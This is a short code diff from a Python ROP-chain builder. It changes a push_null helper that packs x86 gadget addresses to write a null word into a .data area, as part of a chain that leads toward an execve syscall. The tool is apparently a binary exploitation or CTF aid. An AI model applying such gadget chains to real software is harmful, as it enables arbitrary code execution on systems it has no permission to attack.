@@ -21,13 +21,23 @@ def push_ptr(ptr, address):
     return p
 
 
-def push_null(address):
-    p = b''
-    p += pack('<I', 0x0806e13b) # pop edx ; ret
-    p += pack('<I', address) # @ .data + 8
-    p += pack('<I', 0x08056190) # xor eax, eax ; ret
-    p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
-    return p
+def push_null(address,null,first_time_executed=[True]):
+    if(first_time_executed[0]):
+        p = b''
+        p += pack('<I', 0x0806e13b) # pop edx ; ret
+        p += pack('<I', address) # @ .data + 8
+        p += pack('<I', 0x08056190) # xor eax, eax ; ret
+        p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
+        null = address
+        first_time_executed[0] = False
+    else:    
+        p = b''
+        p += pack('<I', 0x0806e13b) # pop edx ; ret
+        p += pack('<I', address) # @ .data + 8
+        p += pack('<I', 0x08056190) # xor eax, eax ; ret
+        p += pack('<I', 0x08056bd5) # mov dword ptr [edx], eax ; ret
+
+    return p,null
 
 
 def execve_syscall(argv_ptr, envp_ptr):
